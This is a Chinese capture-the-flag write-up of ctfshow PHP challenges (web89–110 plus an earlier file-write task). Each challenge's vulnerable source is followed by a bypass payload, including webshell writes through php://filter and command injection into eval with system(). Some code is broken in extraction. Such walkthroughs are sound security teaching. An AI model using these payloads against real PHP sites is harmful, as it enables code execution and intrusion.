10*/ 11highlight_file(__FILE__); 12error_reporting(0); 13function filter($x){ 14 if(preg_match(\u0026#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i\u0026#39;,$x)){ 15 die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 16 } 17} 18$file=$_GET[\u0026#39;file\u0026#39;]; 19$contents=$_POST[\u0026#39;contents\u0026#39;]; 20filter($file); 21file_put_contents($file, \u0026#34;\u0026lt;?php die();?\u0026gt;\u0026#34;.$contents); 这题过滤了一些php的协议和转换器\n但是没过滤掉filter和convert\n我们可以考虑用filter搭配convert.iconv.*过滤器来构造出payload\n参考文章：详解php://filter以及死亡绕过_filter绕过过滤-CSDN博客\n1\u0026lt;?php 2 ?\u0026gt;\u0026#39;); 3echo $enc; 4?\u0026gt; 首先我们先将一句话木马从UCS-2BE转换成UCS-2LE\n?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? 接着构造payload将一句话木马从UCS-2LE转换回UCS-2BE，同时破坏掉\u003c?php die();?\u003e\n效果如下\npayload:\nfile=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php\rcontents=?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? 成功写入一句话木马，拿到flag\nphp特性 参考网站：\nphp一些特性函数（ctfshow）\nweb89 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-18 15:38:51 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18if(isset($_GET[\u0026#39;num\u0026#39;])){ 19 $num = $_GET[\u0026#39;num\u0026#39;]; 20 if(preg_match(\u0026#34;/[0-9]/\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num)){ 24 echo $flag; 25 } 26} 这题要用到数组绕过的特性来绕过preg_match的匹配\npreg_match函数： preg_match函数是用于完成字符串的正则匹配的函数，如果找到一个匹配的，就返回1，否则就返回0。 preg_match只能处理字符串，如果传入的值是数组的话，就会报错，从而返回false，绕过了正则匹配。\nintval函数: 定义:intval()函数是 PHP 中的一个内置函数。它用于获取变量的整数值。其基本语法是intval($var, $base = 10)。其中$var是要转换的变量，$base是可选参数，用于指定进制（当$var`是字符串时），默认是十进制。\n特性：\n1.如果变量本身是整数，intval()函数会返回变量本身的值。\n2.当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\n3.如果字符串以非数字字符开头，intval()会返回 0。\n4.当第二个参数$base被指定时，intval()可以将字符串按照指定的进制转换为十进制整数。\n注意事项\n1.对于浮点数，intval()会直接截断小数部分，而不是进行四舍五入。\n2.当处理超出整数范围的值时（在 PHP 中，根据平台和配置不同，整数范围有所不同），可能会出现意外的结果。例如，在 32 位系统上，int类型的最大值是2147483647，如果intval()处理的值超过这个范围，可能会导致数据丢失或者不正确的转换。\n这道题直接用数组绕过\npayload:\n?num[]=1 web90 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:06:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17if(isset($_GET[\u0026#39;num\u0026#39;])){ 18 $num = $_GET[\u0026#39;num\u0026#39;]; 19 if($num===\u0026#34;4476\u0026#34;){ 20 die(\u0026#34;no no no!\u0026#34;); 21 } 22 if(intval($num,0)===4476){ 23 echo $flag; 24 }else{ 25 echo intval($num,0); 26 } 27} 设置$base = 0能提供一种根据字符串内容自动判断进制来进行转换的灵活方式。\n这道题可以利用intval的特性和php强比较的特性\n当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\nweb91 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:16:09 9# @link: https://ctfer.com 10 11*/ 12 13show_source(__FILE__); 14include(\u0026#39;flag.php\u0026#39;); 15$a=$_GET[\u0026#39;cmd\u0026#39;]; 16if(preg_match(\u0026#39;/^php$/im\u0026#39;, $a)){ 17 if(preg_match(\u0026#39;/^php$/i\u0026#39;, $a)){ 18 echo \u0026#39;hacker\u0026#39;; 19 } 20 else{ 21 echo $flag; 22 } 23} 24else{ 25 echo \u0026#39;nonononono\u0026#39;; 26} 这题考察的是一个正则表达式的理解和绕过\n这两个正则表达式都是用来匹配字符串php的\n/^php$/im 的含义 ^：表示字符串的开始。 php：表示匹配字符 php。 $：表示字符串的结束。 i：表示不区分大小写。 m：表示多行模式（multi-line）。 要得到flag，我们需要让第一个判断为true，第二个判断为false\n而第二个正则表达式与正则表达式一的区别在于他没有进行多行匹配\n那我们只需要通过换行符就可以实现绕过\npayload:\ncmd=%oaphp web92 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:29:30 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(intval($num,0)==4476){ 21 echo $flag; 22 }else{ 23 echo intval($num,0); 24 } 25} 这题与90题的区别就在于这里进行的是弱类型的比较\n在弱类型的比较里面我们不能通过增加字母的方式绕过，如下\n\u0026#34;123aa\u0026#34; == 123\r\u0026#34;123aa\u0026#34; === 123aa 我们可以通过其它方法来绕过\n如通过intval函数的特性，我们可以通过输入转换成其他进制的4476来进行绕过（前面说过当base=0时会自动进行进制的转换）。\npayload：\nHEX: 0x117c //十进制前面补0x\rOCT: 010574 //八进制前面补0 或者\n官方题解\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取,但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476，我们就可以构造 4476e123\nweb93 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:32:58 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num,0)==4476){ 24 echo $flag; 25 }else{ 26 echo intval($num,0); 27 } 28} preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num) 相比上一题这题增加了一个字母的匹配，让我们不能用上一题e绕过的方法和十六进制绕过的方法\n但是八进制绕过依旧是可行的，因为他不包含字母\npayload:\nnum=010574 web94 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:46:19 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num===\u0026#34;4476\u0026#34;){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} !strpos($num, \u0026#34;0\u0026#34;) 这题增加了一个条件，同时判断也变成了强判定，这里的strpos()函数用于查找字符串在另一个字符串中首次出现的位置。\n也就是这里我们需要让首位不等于0才能使这个判断为false\nstrops函数绕过： 对于strpos()函数，我们可以利用换行进行绕过（%0a） payload:?num=%0a010574 也可以小数点绕过 payload：?num=4476.0 因为intval()函数只读取整数部分 还可以八进制绕过(%20是空格的url编码形式) payload：?num=%20010574 ?num= 010574 // 前面加个空格 ?num=+010574 ?num=+4476.0\n我们选用其中一个绕过方法即可\n如空格绕过\n?num=%20010574 这题因为用的是强判定也可以用这种方法\n?num=4476.0 这种方法就是使其变为浮点型从而使强判定为false，绕过第一个判定\nweb95 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:53:59 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!!!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} 这题和上一题的区别就是改为了弱判定\n所以上一题的方法二就用不了了，我们用方法一即可\npayload:\n?num=%20010574 web96 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:21:24 9# @link: https://ctfer.com 10 11*/ 12 13 14highlight_file(__FILE__); 15 16if(isset($_GET[\u0026#39;u\u0026#39;])){ 17 if($_GET[\u0026#39;u\u0026#39;]==\u0026#39;flag.php\u0026#39;){ 18 die(\u0026#34;no no no\u0026#34;); 19 }else{ 20 highlight_file($_GET[\u0026#39;u\u0026#39;]); 21 } 22 23 24} 我们知道./指的的是当前目录，所以直接用./绕过即可，不影响文件读取\npayload:\n?u=./flag.php or\nu=/var/www/html/flag.php\r?u=php://filter/read=convert.base64-encode/resource=flag.php web97 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:36:32 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if (isset($_POST[\u0026#39;a\u0026#39;]) and isset($_POST[\u0026#39;b\u0026#39;])) { 16if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) 17if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) 18echo $flag; 19else 20print \u0026#39;Wrong.\u0026#39;; 21} 22?\u0026gt; 这是一道md5强比较的题目，绕过姿势挺多\n我们可以通过简单的数组绕过\na[]=1\u0026amp;b[]=2 虽然会报错但是能拿到flag\nweb98 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 21:39:27 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14$_GET?$_GET=\u0026amp;$_POST:\u0026#39;flag\u0026#39;; 15$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_COOKIE:\u0026#39;flag\u0026#39;; 16$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_SERVER:\u0026#39;flag\u0026#39;; 17highlight_file($_GET[\u0026#39;HTTP_FLAG\u0026#39;]==\u0026#39;flag\u0026#39;?$flag:__FILE__); 18 19?\u0026gt; CTFSHOW web入门刷题 web98-112_ctfshow web98-CSDN博客\n这道题用到了三元运算符\n首先判断是否GET传入了数据，如果传入了则将POST的地址赋值给了GET\n其实就是用POST替换GET\n如果GET存在flag字段的值则会继续替换，最后替换成SERVER\n这里我们只要GET随便传入一个数据让post替换get\n然后post传入 HTTP_FLAG=flag\n这样最后highlight_file就能去显示$flag\n这道题一开始没看懂代码，看了上面大佬的解释感觉其实也不难\nweb99 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 22:36:12 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14$allow = array(); 15for ($i=36; $i \u0026lt; 0x36d; $i++) { 16 array_push($allow, rand(1,$i)); 17} 18if(isset($_GET[\u0026#39;n\u0026#39;]) \u0026amp;\u0026amp; in_array($_GET[\u0026#39;n\u0026#39;], $allow)){ 19 ($_GET[\u0026#39;n\u0026#39;], $_POST[\u0026#39;content\u0026#39;]); 20} 21 22?\u0026gt; 这道题首先是创建了一个数组，然后通过循环写入数字（范围0~0x36d）\n接着对传入的n进行判断，判断其是否在数组中，若存在则以n为名字创建一个文件并写入content的内容\n我们需要知道的是：\n在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的\n所以我们通过传入content写马后，通过蚁剑连接或者直接命令执行即可得到flag\nweb100 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-21 22:10:28 9\\# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ 23 if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30 31 32?\u0026gt; 这题其实就是一道简单的拼接题\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 这里看起来像是要求v1，v2，v3都为数字，实际上只需v1为数字则会将v1赋给v0，而不会再执行后面的语句\n所以我们这里只需要使v1为数字即可\npayload:\n?v1=21\u0026amp;v2=var_dump($ctfshow)/*\u0026amp;v3=*/; 或者用命令\n1?v1=1\u0026amp;v2=system(\u0026#39;ls\u0026#39;)/*\u0026amp;v3=*/; 将0x2d更换成-得到flag\nweb101 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-22 00:26:48 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|[0-9]/\u0026#34;, $v2)){ 23 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|[0-9]/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30?\u0026gt; 题目描述:修补100题非预期,替换0x2d\n修补了上一题通过直接命令执行或者var_dump打印类的方法\n我们可以尝试使用反射类的方法，利用题目给出的('ctfshow')来拼接打印类\npayload:\n?v1=1\u0026amp;v2=echo new Reflectionclass\u0026amp;v3=; 这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag\npayload:\n1a = \u0026#34;fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42\u0026#34; 2b = a.replace(\u0026#34;0x2d\u0026#34;,\u0026#34;-\u0026#34;) 3hex = [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;4\u0026#34;,\u0026#34;5\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;,\u0026#34;d\u0026#34;,\u0026#34;e\u0026#34;] 4for i in hex: 5 print(\u0026#34;ctfshow{\u0026#34;+b+i+\u0026#34;}\u0026#34;) web102 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 20:59:43 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 file_put_contents($v3,$str); 23} 24else{ 25 die(\u0026#39;hacker\u0026#39;); 26} 27 28 29?\u0026gt; 分析一下这段代码\n首先这段代码会接收三个参数v1,v2,v3\n根据php的特性，当$v2为数字时$v4就会被赋值为1，而与$v3的值无关\n所以想要进入判断，我们首先要使v2为数字\n接着会通过substr对v2前两段进行截断并赋值给s\n下一步就会将v1和s都传入call_user_func函数\ncall_user_func函数有什么用呢?\ncall_user_func 是 PHP 中的一个内置函数，它的主要作用是调用回调函数。\nfunction greet($name) {\rreturn \u0026#34;Hello, $name!\u0026#34;;\r}\r$message = call_user_func(\u0026#39;greet\u0026#39;, \u0026#39;John\u0026#39;);\recho $message; 我们先不管他怎么利用，接着往下看\n最后会调用file_put_contents函数，那思路就很明显了，我们通过写文件来拿到flag\n但是我们要将v2这一串数字经过一系列转换后写入文件并执行要怎么做呢？\n假如说我们可以将php代码转换成base64后再转换成hex，而得到的hex又刚好为数字，那我们就能实现我们的目标。\n那怎么进行格式转换呢?\n我们可以通过call_user_func函数调用php的内置类hex2bin，将我们传入的v2转换回base64编码，接着在写文件的时候，再通过php伪协议的方式将base64先转换为我们的代码再写入文件。\n经过尝试我们可以得到符合条件的代码\n\u0026lt;?=`cat *`;\rbase64:PD89YGNhdCAqYDs= (转hex去掉=)\rhex:5044383959474E6864434171594473 我们需要在hex前面随便加两位数字来绕过截断\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web103 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 21:03:24 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 if(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){ 23 file_put_contents($v3,$str); 24 } 25 else{ 26 die(\u0026#39;Sorry\u0026#39;); 27 } 28} 29else{ 30 die(\u0026#39;hacker\u0026#39;); 31} 32 33?\u0026gt; 这题相比上一题多了一个过滤\nif(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){\rfile_put_contents($v3,$str);\r}\relse{\rdie(\u0026#39;Sorry\u0026#39;);\r} 继续用上题的方法即可\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web104 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:27:20 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2)){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; 使v1=v2即可\nv1=1\rv2=1 web105 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:34:07 9 10*/ 11 12highlight_file(__FILE__); 13include(\u0026#39;flag.php\u0026#39;); 14error_reporting(0); 15$error=\u0026#39;你还想要flag嘛？\u0026#39;; 16$suces=\u0026#39;既然你想要那给你吧！\u0026#39;; 17foreach($_GET as $key =\u0026gt; $value){ 18 if($key===\u0026#39;error\u0026#39;){ 19 die(\u0026#34;what are you doing?!\u0026#34;); 20 } 21 $$key=$$value; 22}foreach($_POST as $key =\u0026gt; $value){ 23 if($value===\u0026#39;flag\u0026#39;){ 24 die(\u0026#34;what are you doing?!\u0026#34;); 25 } 26 $$key=$$value; 27} 28if(!($_POST[\u0026#39;flag\u0026#39;]==$flag)){ 29 die($error); 30} 31echo \u0026#34;your are good\u0026#34;.$flag.\u0026#34;\\n\u0026#34;; 32die($suces); 33 34?\u0026gt; 本题考查变量覆盖和die()的知识\n$$a = $$b可以类似于，将$a的地址指向$b\n所以无论$b怎么改变值，$a的值都会和$b一样\ndie()函数虽然会终止程序，但同时也会输出括号内的终止提示信息\n方法一：\n本题利用变量覆盖和die()函数的特性\n先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=\u0026gt;flag的地址 再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=\u0026gt;flag的地址 此时无论进入哪个die()函数，都可以输出$flag的值 payload:\nGet: suces=flag\rPOST: error=suces 方法二：\nGet: ?suces=flag\u0026amp;flag= 先将flag的值赋给suces，再将flag的值赋为空，从而通过判断，输出suces的值\nweb106 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:38:27 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2) \u0026amp;\u0026amp; $v1!=$v2){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; 我们使用数组绕过即可\nv1[]=1\rv2[]=0 web107 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:24:14 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if(isset($_POST[\u0026#39;v1\u0026#39;])){ 18 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 19 $v3 = $_GET[\u0026#39;v3\u0026#39;]; 20 parse_str($v1,$v2); 21 if($v2[\u0026#39;flag\u0026#39;]==md5($v3)){ 22 echo $flag; 23 } 24 25} 26 27 28 29?\u0026gt; parse_str函数:它用于将字符串解析为变量，如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 arr 则会设置到该数组里 ）。\n1\u0026lt;?php 2 //parse_str()将查询的字符串解析到变量中 3 parse_str(\u0026#34;name=Gopal K Verma\u0026amp;age=45\u0026#34;); 4 5 echo $name.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 6 echo $age; 7?\u0026gt; 其实实际上就是md5弱比较\n方法一：随便给一个值给flag，将MD5转换后的值赋给v3\nv3=1\rv1=flag=c4ca4238a0b923820dcc509a6f75849b 方法二:数组绕过\nv3[]=1\rv1=\u0026#34;flag[]=1\u0026#34; web108 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:53:55 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if (ereg (\u0026#34;^[a-zA-Z]+$\u0026#34;, $_GET[\u0026#39;c\u0026#39;])===FALSE) { 18 die(\u0026#39;error\u0026#39;); 19 20} 21//只有36d的人才能看到flag 22if(intval(strrev($_GET[\u0026#39;c\u0026#39;]))==0x36d){ 23 echo $flag; 24} 25 26?\u0026gt; 题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00来绕过正则的判断。\npayload\nGET:?c=a%00778 web109 考点:php原生类利用\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:02:34 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v1) \u0026amp;\u0026amp; preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v2)){ 20 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 21 } 22 23} 24 25?\u0026gt; 关于php原生类的利用\nhttps://blog.csdn.net/weixin_54902210/article/details/124689580\npayload:\nv1=Exception\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) or\rv1=Reflectionclass\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) 其他的原生类也行，比如Error\nweb110 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:49:10 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v1)){ 20 die(\u0026#34;error v1\u0026#34;); 21 } 22 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v2)){ 23 die(\u0026#34;error v2\u0026#34;); 24 } 25 26 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 27 28} 29 30?\u0026gt; 